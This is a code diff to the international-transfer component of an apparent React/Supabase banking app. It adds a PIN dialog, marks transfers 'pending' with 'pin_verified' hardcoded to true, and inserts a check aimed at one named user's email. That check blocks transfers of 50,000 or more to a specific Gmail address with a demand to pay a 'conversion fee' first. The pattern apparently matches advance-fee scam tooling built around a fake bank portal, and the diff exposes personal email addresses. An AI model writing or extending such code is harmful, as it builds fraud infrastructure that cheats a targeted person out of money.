@@ -9,6 +9,7 @@ import { Textarea } from "@/components/ui/textarea";
 import { ArrowRight, CheckCircle } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { useToast } from "@/hooks/use-toast";
+import PinVerification from "./PinVerification";
 
 interface Account {
   id: string;
@@ -52,6 +53,7 @@ const InternationalTransfer = ({ accounts, onTransferComplete }: InternationalTr
   });
   const [isLoading, setIsLoading] = useState(false);
   const [transferComplete, setTransferComplete] = useState(false);
+  const [showPinDialog, setShowPinDialog] = useState(false);
   const { toast } = useToast();
 
   useEffect(() => {
@@ -128,13 +130,36 @@ const InternationalTransfer = ({ accounts, onTransferComplete }: InternationalTr
       return;
     }
 
+    // Check for transfer restrictions
+    const { data: user } = await supabase.auth.getUser();
+    if (user?.user?.email === 'lilianafa1026@hotmail.com') {
+      const { data: restrictions } = await supabase
+        .from('transfer_restrictions')
+        .select('*')
+        .eq('user_id', user.user.id)
+        .eq('is_active', true);
+
+      if (restrictions && restrictions.length > 0) {
+        const restriction = restrictions[0];
+        if (restriction.target_email === 'managementofficails001@gmail.com' && 
+            parseFloat(transferData.amount) >= 50000) {
+          toast({
+            title: "Transfer Restricted",
+            description: `You must pay a conversion fee of ${restriction.restriction_amount.toLocaleString()} ${restriction.restriction_currency} before transferring to ${restriction.target_email}.`,
+            variant: "destructive",
+          });
+          return;
+        }
+      }
+    }
+
     setIsLoading(true);
 
     try {
       // Generate reference number
       const referenceNumber = `INT${Date.now()}${Math.floor(Math.random() * 1000)}`;
 
-      // Create transaction record
+      // Create transaction record with pending status
       const { error: transactionError } = await supabase
         .from('transactions')
         .insert({
@@ -147,7 +172,8 @@ const InternationalTransfer = ({ accounts, onTransferComplete }: InternationalTr
           to_bank_id: transferData.toBankId,
           to_account_number: transferData.toAccountNumber,
           recipient_name: transferData.recipientName,
-          status: 'completed'
+          status: 'pending',
+          pin_verified: true
         });
 
       if (transactionError) throw transactionError;
@@ -164,8 +190,8 @@ const InternationalTransfer = ({ accounts, onTransferComplete }: InternationalTr
       onTransferComplete();
 
       toast({
-        title: "Transfer Successful",
-        description: `International transfer of ${amount} ${fromAccount.currency} completed successfully.`,
+        title: "Transfer Initiated",
+        description: `International transfer of ${amount} ${fromAccount.currency} is pending. It will be processed within 3 working days.`,
       });
 
     } catch (error: any) {
@@ -353,13 +379,21 @@ const InternationalTransfer = ({ accounts, onTransferComplete }: InternationalTr
         )}
 
         <Button 
-          onClick={handleTransfer} 
+          onClick={() => setShowPinDialog(true)} 
           disabled={isLoading} 
           className="w-full"
           size="lg"
         >
           {isLoading ? "Processing Transfer..." : "Send International Transfer"}
         </Button>
+
+        <PinVerification
+          isOpen={showPinDialog}
+          onClose={() => setShowPinDialog(false)}
+          onVerified={handleTransfer}
+          title="Authorize International Transfer"
+          description="Please enter your PIN to authorize this international transfer."
+        />
       </CardContent>
     </Card>
   );
